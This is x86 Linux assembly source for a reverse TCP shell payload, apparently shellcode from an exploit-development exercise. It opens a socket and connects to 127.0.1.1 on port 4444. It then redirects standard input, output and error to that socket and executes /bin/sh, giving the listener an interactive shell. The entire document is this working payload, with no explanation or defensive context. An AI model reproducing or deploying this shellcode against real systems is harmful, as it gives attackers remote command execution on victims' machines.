global _start

section .text

_start:
	; socketcall
	xor eax, eax
	mov al, 0x66
	xor ebx, ebx
	mov bl, 1

	xor ecx, ecx
	push ecx
	push ebx
	push 0x2
	mov ecx, esp
	int 0x80

	mov edi, eax

	;connect
	xor eax, eax
	push 0x0101017F
	push word 0x5c11
	inc ebx	
	push word bx
	inc ebx
	mov edx, esp

	mov al, 0x66
	push 0x10
	push edx
	push edi
	mov ecx, esp

	int 0x80

	;dup2 for loop
	xor ecx, ecx
	mov cl, 2

duploop:
	mov al, 0x3f	
	int 0x80
	dec ecx
	jns duploop	

	;execve
	mov al, 0xb
	xor ecx, ecx
	push ecx,
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	xor edx, edx
	int 0x80
